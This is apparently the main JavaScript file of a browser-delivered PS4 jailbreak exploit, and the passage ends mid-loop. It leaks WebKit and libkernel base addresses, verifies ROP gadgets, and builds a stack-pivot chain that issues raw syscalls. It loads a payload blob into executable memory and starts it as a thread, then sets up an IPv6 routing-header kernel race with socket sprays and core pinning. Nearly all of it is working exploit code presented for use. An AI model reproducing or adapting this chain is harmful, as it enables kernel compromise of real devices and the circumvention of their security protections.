import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0,
  failCount = 0;
let armedEver = false;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function post(tag, detail) {
  try {
    const x = new XMLHttpRequest();
    x.open("POST", "/t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send(
      "PS4-JB&tag=" +
        encodeURIComponent(tag) +
        "&detail=" +
        encodeURIComponent(String(detail == null ? "" : detail)),
    );
  } catch (e) {}
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
  / -- /,
  /\.\s/,
  /;\s/,
  /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/,
  /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";
if (SHOW_LOG && document.body) document.body.className = "log";
function finishUI(ok) {
  if (SHOW_LOG || !document.body) return;
  const m = document.getElementById("msg");
  if (m)
    m.textContent = ok
      ? "DONE"
      : armedEver
        ? "Restart your console"
        : "Refresh the page and run again";
  document.body.className = ok ? "done" : "fail";
}
function mark(tag, detail) {
  const raw = detail;
  detail = terse(detail);
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  if (SHOW_LOG && outEl) {
    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines
      .map(function (l) {
        l = esc(l);
        const c =
          /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED|GIVEUP|NO-STORAGE|UNSEEN/i.test(
            l,
          )
            ? "bad"
            : /WARN|SKIP|REFUS|COMMITTED|DIRTY/i.test(l)
              ? "warn"
              : /\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)
                ? "ok"
                : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
      })
      .join("\n");
    outEl.scrollTop = outEl.scrollHeight;
  }
  post(tag, raw);
}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
  else post(tag, detail);
}
function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20,
  getuid: 0x18,
  close: 6,
  socket: 97,
  socketpair: 0x87,
  getsockopt: 118,
  setsockopt: 0x69,
  mmap: 477,
  munmap: 73,
  thr_self: 432,
  getgroups: 79,
  getgid: 47,
  cpuset_getaffinity: 487,
  cpuset_setaffinity: 488,
  aio_multi_poll: 664,
  aio_multi_delete: 662,
  getegid: 43,
  aio_multi_wait: 663,
  aio_multi_cancel: 666,
  aio_submit_cmd: 669,
  write: 4,
  sysctl: 202,
  kill: 37,
  getppid: 39,
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null,
  mainOrig = null,
  mainArmed = false;
let pinRestore = null;

let jbRestoreHook = null;
let allDone = false,
  jailbroken = false,
  kpatched = false,
  payloadRunning = false;

(async function () {
  let p = null;

  const opened = [];
  let closeFd = null;
  try {
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("BUILD", "jb=skipjb2 base=ef1670a");
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("no offsets for this firmware", "bad");
      return;
    }
    const fwKey = key || "unknown";

    const DO_JB = params.get("jb") !== "0";
    const DO_PATCH = params.get("patch") !== "0";
    const DO_PAYLOAD = params.get("payload") !== "0";
    const SKIPJB = params.get("skipjb") !== "0";

    const KEEP_JB = params.get("keepjb") === "1";

    const NEED_K = [
      "k_idt_rsvd",
      "k_oid_kern_file",
      "k_oid_maxfilesperproc",
      "k_oid_maxprocperuid",
      "k_oid_maxfiles",
      "k_arg1_maxfilesperproc",
      "k_arg1_maxprocperuid",
      "k_arg1_maxfiles",
      "k_prison0",
      "k_rootvnode",
    ];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (
      !check(
        "kernel-table-present",
        missing.length === 0,
        "fw=" +
          fwKey +
          " missing=[" +
          missing.join(",") +
          "]" +
          " -- dump this firmware with kdump5.html and derive its table" +
          " with tools/kderive.py; stage=pre_primitive",
      )
    )
      return;

    const KPATCH_FILE =
      "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
    const PAYLOAD_FILE = off.payload || "payload.bin";
    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "kpatch-table-present",
        !DO_PATCH || needPatch.length === 0,
        "missing=[" +
          needPatch.join(",") +
          "] blob=" +
          KPATCH_FILE +
          " -- build it from patches/<fw>.c, see patches/1300.c",
      )
    )
      return;
    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
      (k) => off[k] === undefined,
    );
    if (
      !check(
        "payload-table-present",
        !DO_PAYLOAD || needPl.length === 0,
        "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
      )
    )
      return;
    mark("FW-STATUS", off.fw_status || "none");
    mark(
      "FW-KTABLE",
      "idt_rsvd=0x" +
        off.k_idt_rsvd.toString(16) +
        " prison0=0x" +
        off.k_prison0.toString(16) +
        " rootvnode=0x" +
        off.k_rootvnode.toString(16) +
        " kpatch=" +
        KPATCH_FILE +
        " payload=" +
        PAYLOAD_FILE +
        " src=ps4_offsets.js",
    );

    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
    // phase -- no kernel .data/.text has been touched yet, so reloading and
    // retrying is safe. The counter lives in sessionStorage so it survives
    // the reload and is cleared the moment the read phase succeeds, so a
    // later manual run always starts fresh. NEVER call retryBenign() after a
    // kernel write: a reload would re-enter with the kernel already modified.
    // A hard KP (a total reclaim miss that faults inside the cancel walk)
    // cannot be caught here and still needs a reboot -- this only recovers
    // the benign, detectable misses.
    const retryArg = parseInt(params.get("retry") || "", 10);
    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
    const RETRY_KEY = "jb1352-read-retry";
    const retryCount = () => {
      try {
        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
        return Number.isFinite(v) && v > 0 ? v : 0;
      } catch (e) {
        return 0;
      }
    };
    const clearRetry = () => {
      try {
        sessionStorage.removeItem(RETRY_KEY);
      } catch (e) {}
    };
    const retryBenign = (why) => {
      const n = retryCount();
      if (n >= RETRY_MAX) {
        mark(
          "AUTO-RELOAD-GIVEUP",
          "why=" + why + " reloads=" + n + " -- reboot and try again",
        );
        return false;
      }
      let stored = -1;
      try {
        sessionStorage.setItem(RETRY_KEY, String(n + 1));
        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
      } catch (e) {
        stored = -1;
      }
      if (stored !== n + 1) {
        mark(
          "AUTO-RELOAD-NO-STORAGE",
          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
        );
        return false;
      }
      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
      setTimeout(() => {
        try {
          location.reload();
        } catch (e) {}
      }, 400);
      return true;
    };
    if (retryCount() > 0)
      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);

    state("running the primitive...", "warn");
    await new Promise((r) => setTimeout(r, 0));

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const carrier = await establishPrimitive({
      maxAttempts: 6,
      onEvent: (t, d, a) =>
        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
          t,
          (a != null ? "[" + a + "] " : "") + (d || ""),
        ),
    });
    installWindowP(carrier, { promote: false });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark(
      "PAIR-STATUS",
      "state=" +
        pairStatus.state +
        " promoted=" +
        pairStatus.promoted +
        "   (promotion off: the 137 MB stays pinned)",
    );
    mark("PRIMITIVE-OK", "");

    const cell = p.leakval(Math.expm1);
    const nativeFn = p.read8(
      p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
    );
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    const libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
    if (
      !check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        "",
      )
    )
      return;

    const G = {};
    const GAD = [
      ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
      ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
      ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
      ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
      ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
      ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
      ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
      ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
      [
        "MOV_RDI_RAX_RET",
        off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
        [0x48, 0x89, 0x07, 0xc3],
      ],
      ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
      ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
      ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
      ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
      [
        "G4",
        off.wk_MOV_RDX_RAX_18_CALL_10,
        [0x48, 0x8b, 0x50, off.pivot_view_sp],
      ],
      ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
      const a = webkitBase.add32(rva);
      let good = true;
      for (let i = 0; i < pat.length; ++i) {
        if (pat[i] === null) continue;
        if (p.read1(a.add32(i)) !== pat[i]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (
      !check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length,
      )
    )
      return;
    const argGadget = [
      G.POP_RDI_RET,
      G.POP_RSI_RET,
      G.POP_RDX_RET,
      G.POP_RCX_RET,
      G.POP_R8_RET,
      G.POP_R9_RET,
    ];

    const stubAddr = new Map();
    let seeded = 0;
    if (off.k_stubs) {
      for (const numStr in off.k_stubs) {
        const num = +numStr,
          o = off.k_stubs[numStr];
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
          continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    const need = new Set(
      Object.keys(SYS)
        .map((k) => SYS[k])
        .filter((n) => !stubAddr.has(n)),
    );
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
      const v = p.read8(libkernelBase.add32(o));
      if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
      const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
      if (!need.has(num)) continue;
      stubAddr.set(num, libkernelBase.add32(o));
      need.delete(num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
      return;

    function bufAddr(ab) {
      const c = p.leakval(ab);
      return p.read8(
        p
          .read8(c.add32(off.wk_ArrayBuffer_m_impl))
          .add32(off.wk_ArrayBuffer_m_contents_m_data),
      );
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
      const sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      const kb = new ArrayBuffer(0x2000),
        fb = new ArrayBuffer(0x40);
      keepAlive.push(sb, pb, kb, fb);
      const c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb),
      };
      keepAlive.push(
        c.storeDv,
        c.pivotDv,
        c.stackDv,
        c.frameDv,
        c.stackU8,
        c.frameU8,
      );
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      const insts = [];
      for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
      }
      const targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      let at = 0x2000 - 8 * insts.length;
      if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
      for (let i = 0; i < insts.length; ++i)
        put(c.stackDv, at + 8 * i, insts[i]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    const pivotObj = {};
    keepAlive.push(pivotObj);
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      const saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0,
      };
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    closeFd = (fd) => sc(SYS.close, fd).i32;
    function errno() {
      const r = callAddr(errorFn, []);
      const a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }
    async function relaunchPayload() {
      let blob = null;
      try {
        const r = await fetch(PAYLOAD_FILE);
        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
      } catch (e) {}
      if (!blob || blob[0] !== 0xe9) {
        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
        return;
      }
      const sz = (blob.length + 0x3fff) & ~0x3fff;
      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
      const entry = new int64(m.lo, m.hi);
      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
        mark("JB-RELAUNCH", "mmap failed err=" + errno());
        return;
      }
      for (let o = 0; o < blob.length; o += 8) {
        let lo = 0,
          hi = 0;
        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
      }
      let bad = -1;
      for (let o = 0; o < blob.length && bad < 0; o++)
        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
      if (bad >= 0) {
        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
        return;
      }
      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
      const expect = libkernelBase.add32(off.k_pthread_create);
      if (fn.low !== expect.low || fn.hi !== expect.hi) {
        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
        return;
      }
      const thr = new ArrayBuffer(8);
      keepAlive.push(thr);
      new Uint8Array(thr).fill(0);
      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
      const tdv = new DataView(thr);
      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
      check(
        "JB-RELAUNCH",
        payloadRunning,
        "file=" +
          PAYLOAD_FILE +
          " bytes=" +
          blob.length +
          " pthread_create=" +
          rc +
          " handle=" +
          handle,
      );
    }

    const pid = sc(SYS.getpid).i32;
    check(
      "chain-reaches-kernel",
      pid > 0,
      "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
    );

    if (SKIPJB) {
      const SETUID = 23;
      if (!stubAddr.has(SETUID))
        for (let o = 0; o < off.k_scan_stage1; o += 16) {
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
            continue;
          if (
            ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
            SETUID
          ) {
            stubAddr.set(SETUID, libkernelBase.add32(o));
            break;
          }
        }
      if (!stubAddr.has(SETUID)) {
        mark("JB-PROBE", "stub=absent skip=impossible");
      } else {
        const suRv = sc(SETUID, 0).i32;
        const uidNow = sc(SYS.getuid).i32;
        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
        if (suRv === 0 && uidNow === 0) {
          jailbroken = true;
          mark(
            "JB-ALREADY",
            "kernel already patched -- 663 race skipped, pid=" + pid,
          );
          if (DO_PAYLOAD) await relaunchPayload();
          mark(
            "EG-VERDICT",
            "fw=" +
              fwKey +
              " jailbroken=1 kpatched=already payload_running=" +
              (payloadRunning ? 1 : 0) +
              " armings=0 reused=1",
          );
          allDone = true;
          return;
        }
      }
    }

    const scratchAb = new ArrayBuffer(0x1000);
    keepAlive.push(scratchAb);
    const scratch = bufAddr(scratchAb);
    const argAb = new ArrayBuffer(8);
    keepAlive.push(argAb);
    const argAddr = bufAddr(argAb),
      argDv = new DataView(argAb);
    const lenAb = new ArrayBuffer(8);
    keepAlive.push(lenAb);
    const lenAddr = bufAddr(lenAb),
      lenDv = new DataView(lenAb);

    function makeRpc(wk, name) {
      let seq = 0;
      const pending = new Map();
      wk.onmessage = function (e) {
        const d = e.data || {};
        const slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        if (slot.timer) clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));
        else slot.resolve(d.value);
      };
      wk.onerror = (e) =>
        mark(
          "WORKER-ONERROR",
          name + " " + (e && e.message ? e.message : String(e)),
        );
      return function call(fname, timeoutMs, ...args) {
        return new Promise(function (resolve, reject) {
          const id = seq++;
          const timer =
            timeoutMs > 0
              ? setTimeout(function () {
                  pending.delete(id);
                  reject(new Error(name + ": timeout waiting for " + fname));
                }, timeoutMs)
              : null;
          pending.set(id, { resolve, reject, timer });
          wk.postMessage({ id: id, name: fname, args: args });
        });
      };
    }
    function ptrish(v) {
      return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0;
    }

    const IPPROTO_IPV6 = 41,
      IPV6_RTHDR = 51;
    const AF_INET6 = 28,
      SOCK_DGRAM = 2,
      AF_UNIX = 1,
      SOCK_STREAM = 1;
    const numArg = parseInt(params.get("num") || "", 10);
    const NUM = Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
    const RTH_N = NUM > 2 ? 16 : 4;
    const RTH_SIZE = 16 * RTH_N + 8,
      RTH_LEN = 2 * RTH_N,
      RTH_SEGLEFT = RTH_N;
    const SCRATCH_PAGE = (RTH_N << 24) >>> 0,
      NODE0_DEC = ((RTH_N << 24) | (RTH_LEN << 8)) >>> 0;
    const SYS_MMAP = 477;
    const PROT_RW = 3,
      MAP_PRIVATE = 2,
      MAP_FIXED = 0x10,
      MAP_ANON = 0x1000;
    const NODE_SZ = 0x38;
    const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
    const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
    const SPIN = params.get("spin")
      ? parseInt(params.get("spin"), 10)
      : 40000000;
    const CUT = params.get("cut") !== "0";
    const CUT_MARGIN = params.get("cutmargin")
      ? parseInt(params.get("cutmargin"), 10)
      : 8192;
    mark(
      "PR-CFG",
      "nleak=" +
        N_LEAK +
        " spray=" +
        SPRAY +
        " spin=" +
        SPIN +
        " cut=" +
        (CUT ? CUT_MARGIN : 0),
    );

    async function bringWorker(name) {
      const w = { name: name, armed: false, wired: false };
      w.worker = new Worker("rpc_worker.js");
      w.rpc = makeRpc(w.worker, name);
      if ((await w.rpc("ping", 15000)) !== "pong")
        throw new Error(name + " ping");
      const sLo = 0x10100000,
        sHi = 0xc0de0000;
      const arr = await w.rpc("init", 15000, sLo, sHi);
      keepAlive.push(arr);
      const D = bufAddr(arr.buffer);
      if (p.read4(D) >>> 0 !== sLo) throw new Error(name + " transfer");
      const storage = p.read8(D.add32(0x10));
      const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
      if (!mc || !ptrish(mc)) throw new Error(name + " walk");
      const bf = p.read8(mc.add32(8));
      let wm = null,
        wv = null,
        wl = null;
      for (let k = 1; k <= 8; ++k) {
        const val = p.read8(bf.sub32(8 * k));
        if (!ptrish(val)) continue;
        const inl = p.read8(val.add32(0x10));
        const len = p.read4(val.add32(0x18)) >>> 0;
        if (inl.hi === 0 && inl.low === 2) {
          if (!wl) wl = val;
        } else if (inl.hi > 0 && len === 6) {
          if (!wm) wm = val;
        } else if (inl.hi > 0 && len === 0x30) {
          if (!wv) wv = val;
        }
      }
      if (!(wm && wv && wl)) throw new Error(name + " shapes");
      w.master = wm;
      w.origVector = p.read8(wm.add32(0x10));
      p.write8(wm.add32(0x10), wv);
      w.wired = true;
      await w.rpc("setup", 15000, wl.low, wl.hi);
      await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
      w.armed = true;
      w.ctx = makeCtx();
      w.fire = function (num, args, ms) {
        layout(w.ctx, stubAddr.get(num), args);
        return w.rpc(
          "fire",
          ms === undefined ? 20000 : ms,
          w.ctx.S.low,
          w.ctx.S.hi,
        );
      };
      return w;
    }
    const w1 = await bringWorker("w1");
    const w2 = await bringWorker("w2");
    await w1.fire(SYS.getpid, []);
    const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
    await w2.fire(SYS.getpid, []);
    const w2pid = w2.ctx.frameDv.getUint32(0, true) | 0;
    check(
      "pr-two-workers-reach-kernel",
      w1pid > 0 && w2pid > 0,
      "w1 getpid=" +
        w1pid +
        " w2 getpid=" +
        w2pid +
        " main=" +
        sc(SYS.getpid).i32,
    );

    const zoneOf = (s) => {
      const r = s & 15 ? (s + 16) & ~15 : s;
      let z = 16;
      while (z < r) z <<= 1;
      return z;
    };
    const geomOk =
      RTH_SIZE === 8 * (RTH_LEN + 1) &&
      (RTH_LEN & 1) === 0 &&
      RTH_LEN !== 0 &&
      RTH_SEGLEFT === RTH_LEN / 2 &&
      NODE0_DEC === (((RTH_SEGLEFT << 24) | (RTH_LEN << 8)) >>> 0) &&
      NODE0_DEC >= SCRATCH_PAGE &&
      NODE0_DEC < SCRATCH_PAGE + 0x10000 - 4 &&
      !(NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) &&
        NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) + RTH_SIZE) &&
      zoneOf(NUM * 0x38) === zoneOf(RTH_SIZE);
    if (
      !check(
        "pr-geometry-consistent",
        geomOk,
        "num=" +
          NUM +
          " victim=0x" +
          (NUM * 0x38).toString(16) +
          " rth=0x" +
          RTH_SIZE.toString(16) +
          " len=" +
          RTH_LEN +
          " segleft=" +
          RTH_SEGLEFT +
          " zone=" +
          zoneOf(NUM * 0x38) +
          "/" +
          zoneOf(RTH_SIZE) +
          " scratch=0x" +
          SCRATCH_PAGE.toString(16) +
          " node0_dec=0x" +
          NODE0_DEC.toString(16),
      )
    )
      return;

    const mr = sc(
      SYS_MMAP,
      SCRATCH_PAGE,
      0x10000,
      PROT_RW,
      MAP_FIXED | MAP_ANON | MAP_PRIVATE,
      -1,
      0,
    );
    const mgot = new int64(mr.lo, mr.hi);
    if (
      !check(
        "pr-scratch-page-mapped",
        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
        "got=0x" + (mgot.low >>> 0).toString(16),
      )
    )
      return;
    const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (vs < 0) {
      mark("PR-ABORT", "verify socket");
      return;
    }
    opened.push(vs);
    {
      const tAb = new ArrayBuffer(RTH_SIZE);
      keepAlive.push(tAb);
      const tDv = new DataView(tAb);
      tDv.setUint8(1, RTH_LEN);
      tDv.setUint8(3, RTH_SEGLEFT);
      sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
      const RT = SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000);
      lenDv.setUint32(0, RTH_SIZE, true);
      lenDv.setUint32(4, 0, true);
      const g1 = sc(
        SYS.getsockopt,
        vs,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        RT,
        lenAddr,
      ).i32;
      const s2 = sc(
        SYS.setsockopt,
        vs,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        RT,
        lenDv.getUint32(0, true),
      ).i32;
      if (
        !check(
          "pr-scratch-page-kernel-rw",
          g1 === 0 && s2 === 0,
          "copyout=" + g1 + " copyin=" + s2,
        )
      )
        return;
    }

    const mAb = new ArrayBuffer(0xc0);
    keepAlive.push(mAb);
    const mU32 = new Uint32Array(mAb);
    keepAlive.push(mU32);
    const mU8 = new Uint8Array(mAb);
    keepAlive.push(mU8);
    const M_AD = bufAddr(mAb);
    mU32.fill(0);
    mU32[6] = 4;
    const OWNER_LO = 6,
      OWNER_HI = 7;
    const lkAb = new ArrayBuffer(0x40);
    keepAlive.push(lkAb);
    const lkDv = new DataView(lkAb),
      lkAd = bufAddr(lkAb);
    const LX = lkAd.add32(0x00),
      LC = lkAd.add32(0x10);

    const NBLOCK = 8;
    const bspAb = new ArrayBuffer(8);
    keepAlive.push(bspAb);
    const bspDv = new DataView(bspAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
      mark("PR-ABORT", "block socketpair");
      return;
    }
    const bsp0 = bspDv.getInt32(0, true),
      bsp1 = bspDv.getInt32(4, true);
    opened.push(bsp0, bsp1);
    const brbAb = new ArrayBuffer(0x40);
    keepAlive.push(brbAb);
    const brqAb = new ArrayBuffer(NBLOCK * 0x28);
    keepAlive.push(brqAb);
    const brqDv = new DataView(brqAb);
    for (let k = 0; k < NBLOCK; k++) {
      const b = k * 0x28;
      put(brqDv, b + 0x08, 0x40);
      put(brqDv, b + 0x10, bufAddr(brbAb));
      brqDv.setInt32(b + 0x20, bsp0, true);
    }
    const bidAb = new ArrayBuffer(NBLOCK * 4);
    keepAlive.push(bidAb);

    const CPU_LEVEL_WHICH = 3,
      CPU_WHICH_TID = 1,
      CPUSET_SZ = 0x10;
    const ID64 = new int64(0xffffffff, 0xffffffff);
    const mskAb = new ArrayBuffer(CPUSET_SZ);
    keepAlive.push(mskAb);
    const mskDv = new DataView(mskAb),
      mskAd = bufAddr(mskAb);
    new Uint8Array(mskAb).fill(0);
    const affGot = sc(
      SYS.cpuset_getaffinity,
      CPU_LEVEL_WHICH,
      CPU_WHICH_TID,
      ID64,
      CPUSET_SZ,
      mskAd,
    ).i32;
    const savedMask = mskDv.getUint32(0, true) >>> 0;
    const cores = [];
    for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
    mark(
      "PIN-AVAIL",
      "rv=" +
        affGot +
        " mask=0x" +
        savedMask.toString(16) +
        " cores=" +
        cores.join(","),
    );
    if (
      !check(
        "pin-read-mask",
        affGot === 0 && cores.length > 0,
        "rv=" + affGot + " cores=" + cores.length,
      )
    )
      return;
    const coreArg = params.get("core")
      ? parseInt(params.get("core"), 10)
      : -1;
    const candidates = coreArg >= 0 ? [coreArg] : cores.slice();
    let PINCORE = -1,
      affSet = -1,
      backMask = 0;
    for (const c of candidates) {
      new Uint8Array(mskAb).fill(0);
